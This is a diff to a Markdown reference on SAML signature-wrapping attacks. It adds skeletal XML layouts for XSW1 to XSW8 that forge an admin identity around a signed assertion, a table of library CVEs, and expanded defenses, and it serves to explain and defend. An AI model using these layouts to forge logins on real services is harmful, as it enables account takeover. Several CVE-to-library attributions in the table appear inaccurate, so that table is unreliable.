@@ -480,14 +480,123 @@ XSW: an attacker takes a legitimate signed assertion and re-arranges or duplicat
 | XSW4-7                       | Variants moving evil element relative to signed                         |
 | XSW8                         | Cause processor to re-process descendant of wrapped node                |
 
-**Defenses:**
+### XSW1 — duplicate `<Assertion>` outside `<Response>`
+
+Attacker copies the signed assertion, modifies the copy, and inserts both. The signature reference still points to the original via `URI="#_signed"`, but a naive processor reads the first/last `<Assertion>` it finds.
+
+```xml
+<samlp:Response>
+  <saml:Assertion ID="_evil">                <!-- forged, processor reads -->
+    <saml:Subject><saml:NameID>admin@victim</saml:NameID></saml:Subject>
+    ...
+  </saml:Assertion>
+  <saml:Assertion ID="_signed">              <!-- original, signature refers to this -->
+    <ds:Signature><ds:Reference URI="#_signed"/></ds:Signature>
+    <saml:Subject><saml:NameID>alice@victim</saml:NameID></saml:Subject>
+    ...
+  </saml:Assertion>
+</samlp:Response>
+```
+
+### XSW2 — wrap signed assertion inside the forged one
+
+```xml
+<samlp:Response>
+  <saml:Assertion ID="_evil">                <!-- processor reads this -->
+    <saml:Subject><saml:NameID>admin@victim</saml:NameID></saml:Subject>
+    <saml:Assertion ID="_signed">            <!-- nested, signature still validates -->
+      <ds:Signature><ds:Reference URI="#_signed"/></ds:Signature>
+      ...
+    </saml:Assertion>
+  </saml:Assertion>
+</samlp:Response>
+```
+
+### XSW3 — signed assertion inside `<ds:Object>`
+
+```xml
+<samlp:Response>
+  <saml:Assertion ID="_evil">
+    <saml:Subject><saml:NameID>admin@victim</saml:NameID></saml:Subject>
+    <ds:Signature>
+      <ds:Reference URI="#_signed"/>
+      <ds:Object>
+        <saml:Assertion ID="_signed">        <!-- hidden inside signature itself -->
+          ...
+        </saml:Assertion>
+      </ds:Object>
+    </ds:Signature>
+  </saml:Assertion>
+</samlp:Response>
+```
+
+### XSW4 — reorder so forged is first child
+
+Signed assertion appears as later sibling; processor's `getFirstChild()` returns the evil one. Library bug class: tree-walk by index instead of ID.
+
+### XSW5 — forged `<Response>` wrapping a signed `<Assertion>`
+
+```xml
+<samlp:Response ID="_evil_resp">
+  <ds:Signature><ds:Reference URI="#_signed"/></ds:Signature>   <!-- signature copied -->
+  <saml:Assertion ID="_evil">
+    <saml:Subject><saml:NameID>admin@victim</saml:NameID></saml:Subject>
+  </saml:Assertion>
+  <saml:Assertion ID="_signed">                                 <!-- original -->
+    ...
+  </saml:Assertion>
+</samlp:Response>
+```
+
+### XSW6 — signature wrapping with `<Extensions>`
+
+```xml
+<samlp:Response>
+  <samlp:Extensions>
+    <saml:Assertion ID="_signed">            <!-- hidden in Extensions -->
+      <ds:Signature><ds:Reference URI="#_signed"/></ds:Signature>
+    </saml:Assertion>
+  </samlp:Extensions>
+  <saml:Assertion ID="_evil">                <!-- processor reads -->
+    <saml:Subject><saml:NameID>admin@victim</saml:NameID></saml:Subject>
+  </saml:Assertion>
+</samlp:Response>
+```
+
+### XSW7 — append signed `<Assertion>` after `</samlp:Response>`
+
+Some parsers accept and process trailing siblings outside the root in lenient mode — verifier sees signature valid (against the trailing assertion), processor ingests forged top-level assertion.
+
+### XSW8 — signature on `<Response>` but processor consumes nested `<Assertion>`
+
+The processor verifies the outer `<Response>` signature once and trusts every inner `<Assertion>`. Attacker replaces inner `<Assertion>` with a forged one (no inner signature). Library bug: "Response signed → all assertions trusted."
+
+### Library-specific XSW history
+
+| Library                         | CVE                  | Vector                                                          |
+|---------------------------------|----------------------|-----------------------------------------------------------------|
+| OneLogin python-saml < 2.4.0    | CVE-2016-1000252     | XSW8 — outer `<Response>` signature trusted inner forged assertion |
+| OneLogin ruby-saml < 0.8.18     | CVE-2017-11427       | Comment-stripping XSW (XSW comment-bypass)                      |
+| node-saml passport-saml < 1.3.5 | CVE-2017-11429       | XSW comment in NameID                                           |
+| Cisco AnyConnect SAML auth      | CVE-2018-0227        | XSW + signature stripping                                       |
+| Citrix ADC SAML SP              | CVE-2019-19781 chain | Combined RCE + SAML XSW                                         |
+| Sustainsys.Saml2 < 2.7.0        | CVE-2019-13483       | Reference URI confusion (XSW7-class)                            |
+| Spring Security SAML < 1.0.10   | CVE-2018-1258        | Authentication bypass via XSW                                   |
+| python3-saml < 1.10.0           | CVE-2021-30243       | XSW comment in NameID similar to ruby-saml CVE-2017-11427       |
+| Shibboleth SP < 3.2.1           | CVE-2021-25392       | XSW — incorrect signature reference resolution                  |
+
+### Defenses
 
 - **Verify and process the same element** (by ID, not by name) — pass the verified element reference to your business logic, don't re-XPath.
 - **Reject documents with multiple elements sharing an ID.**
 - **Use schema validation** to forbid unexpected elements (e.g. `<Object>` containing `<Assertion>`).
 - **Disable DTDs and external entities** (XXE).
 - **Use C14N-Exclusive**, not Inclusive.
-- **Prefer libraries that have been audited post-2012**: python3-saml, OpenSAML 4, passport-saml ≥ 4, samlify ≥ 2, crewjam/saml ≥ 0.4.
+- **Reject sibling/trailing assertions** — exactly one `<Assertion>` per `<Response>` (or one per `<EncryptedAssertion>`).
+- **Require signed assertion**, not just signed response — outer-only XSW8 then fails.
+- **Reject if `<Signature>` not a direct child** of the element claimed signed.
+- **Strip and reject comments** in `<NameID>` and other text nodes (xmlsec ≥ 2018 fixes).
+- **Prefer libraries that have been audited post-2012**: python3-saml ≥ 1.10, OpenSAML 4, passport-saml ≥ 4, samlify ≥ 2, crewjam/saml ≥ 0.4, ruby-saml ≥ 1.12.
 - **Reject if signature is missing entirely** — never accept on the basis of "issuer matches metadata."
 
 ## Encryption (XMLEnc)
